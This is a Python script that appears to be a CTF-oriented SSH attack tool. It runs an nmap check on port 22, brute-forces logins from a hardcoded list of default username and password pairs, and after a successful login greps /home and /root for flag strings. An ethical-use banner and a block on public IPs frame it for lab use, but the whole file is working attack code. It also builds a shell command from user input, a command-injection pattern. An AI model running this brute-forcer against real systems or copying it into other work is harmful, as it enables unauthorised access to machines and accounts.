import os
import sys
import paramiko
import subprocess
import logging
import ipaddress

# Ensure necessary directories exist
os.makedirs("logs", exist_ok=True)
os.makedirs("outputs", exist_ok=True)

# Setup Logging
LOG_FILE = "logs/exploit_errors.log"
FLAG_OUTPUT_FILE = "outputs/flag_results.txt"

# Configure logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format="%(asctime)s - %(levelname)s - %(message)s")


def log_error(message):
    """Log an error message to the log file and print it to the console, then exit."""
    logging.error(message)
    print(f"\n⚠ ERROR: {message}")
    print(f"⚠ The error has been logged in: {LOG_FILE}")
    sys.exit(1)


def check_root_privileges():
    """Ensure script is run with root privileges."""
    if os.geteuid() != 0:
        log_error("Root privileges are required to run this script. Exiting.")


def check_ip_public(ip_address):
    """Check if the IP address is public and log an error if so."""
    try:
        ip = ipaddress.ip_address(ip_address)
        if ip.is_global:
            log_error(f"Unauthorized scan attempt on public IP address {ip}. Exiting.")
    except ValueError:
        log_error(f"Invalid IP address {ip_address}. Exiting.")


def check_ip_input(ip_address):
    """Check if the IP address input is empty."""
    if not ip_address:
        log_error("Target IP required. Please try again.")


def show_banner():
    """Display the module banner and handle user agreement."""
    print("\n=============== Welcome to the SSH Exploitation Module! ===============")
    print("🚀 This tool is for ethical hacking and learning purposes only. 🚀")
    print("⚠ Do not use it on unauthorized targets.")
    print("\n⚠ WARNING: This tool is for ethical use only.")
    print("By using this tool, you agree to:")
    print("1. Use it only in controlled environments (e.g., CTFs).")
    print("2. Never use it to scan unauthorized targets.")
    print("3. Abide by all applicable laws and policies.")
    agreement = input("\nDo you agree to these terms? [yes/no]: ").strip().lower()
    if agreement != "yes":
        log_error("User declined the ethical use agreement. Exiting.")


# **Password List**
USER_PASSWORD_LIST = [
    ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
    ("user", "password"), ("user", "123456"), ("root", "toor"),
    ("root", "root"), ("root", "admin"), ("root", "12345"),
    ("test", "test"), ("kali", "kali"), ("admin", "qwerty"),
    ("admin", "letmein"), ("admin", "1234"), ("admin", "welcome"),
    ("guest", "guest"), ("support", "support"), ("mysql", "mysql"),
    ("ftp", "ftp"), ("webadmin", "webadmin"), ("oracle", "oracle"),
    ("apache", "apache"), ("ssh", "ssh"), ("backup", "backup"),
    ("manager", "manager"), ("admin", "changeme"), ("root", "changeme"),
    ("admin", "SuperSecurePassword"), ("root", "rasitha")
]


def check_ssh_open(target_ip):
    """Check if SSH port 22 is open using Nmap."""
    print(f"\n🔍 Checking if SSH is open on {target_ip}...")
    command = f"nmap -p 22 {target_ip}"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return "22/tcp open" in result.stdout


def attempt_ssh_login(target_ip, username, password):
    """Attempt SSH login with a given username and password."""
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target_ip, username=username, password=password, timeout=5)
        print(f"\n✅ SUCCESS! Logged in with {username}:{password}")
        logging.info(f"SSH access gained with {username}:{password} on {target_ip}")
        return True, client, username, password
    except paramiko.AuthenticationException:
        print(f"❌ Failed: {username}:{password}")
        return False, None, None, None
    except paramiko.SSHException as e:
        log_error(f"SSH Error: {e}")
        return False, None, None, None
    except Exception as e:
        log_error(f"Unexpected error: {e}")
        return False, None, None, None


def try_default_passwords(target_ip):
    """Try a list of common passwords and return success status."""
    print("\n🔍 Attempting login with default credentials...")
    for username, password in USER_PASSWORD_LIST:
        success, client, user, pwd = attempt_ssh_login(target_ip, username, password)
        if success:
            return True, client, user, pwd
    return False, None, None, None


def search_for_flags(client):
    """Search for flag patterns in files after SSH login."""
    if client is None:
        log_error("SSH connection was lost. Cannot search for flags.")

    print("\n🔍 Searching for flags...")

    try:
        stdin, stdout, stderr = client.exec_command("grep -ir 'flag{' /home /root 2>/dev/null")
        flag_results = stdout.read().decode().strip()

        if flag_results:
            print(f"\n🎯 Flags Found:\n{flag_results}")
            with open(FLAG_OUTPUT_FILE, "w") as file:
                file.write(flag_results)
            print(f"✅ Flags saved in {FLAG_OUTPUT_FILE}")
            logging.info(f"Flags found: {flag_results}")
        else:
            print("\n❌ No flags found.")
            logging.info("No flags found.")

    except Exception as e:
        log_error(f"Error while searching for flags: {e}")


def main():
    """Main function to execute SSH attack techniques."""
    check_root_privileges()
    show_banner()

    while True:
        print("\n🚀 Choose an Option 🚀")
        print("1. Gain SSH Access using Brute Force")
        print("2. Find Flags in SSH")
        print("3. Exit")

        choice = input("\nEnter your choice (1/2/3): ").strip()

        if choice == "1":
            print("\n🚀 Automated SSH Access Attempt Tool 🚀")
            target_ip = input("Enter the target machine's IP address: ").strip()
            check_ip_input(target_ip)
            check_ip_public(target_ip)

            if check_ssh_open(target_ip):
                success, client, username, password = try_default_passwords(target_ip)

                if success:
                    print("\n✅ Successfully gained SSH access!")
                else:
                    print("\n❌ No valid credentials found.")
            else:
                print("\n❌ SSH port is closed.")

        elif choice == "2":
            print("\n🔍 Searching for flags in SSH...")
            target_ip = input("Enter the target machine's IP address: ").strip()
            username = input("Enter SSH username: ").strip()
            password = input("Enter SSH password: ").strip()

            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(target_ip, username=username, password=password, timeout=5)
                search_for_flags(client)
                client.close()
            except Exception as e:
                log_error(f"Error connecting to SSH: {e}")

        elif choice == "3":
            print("\nExiting tool...")
            sys.exit(0)
        else:
            print("\n❌ Invalid choice. Please enter 1, 2, or 3.")


if __name__ == "__main__":
    main()
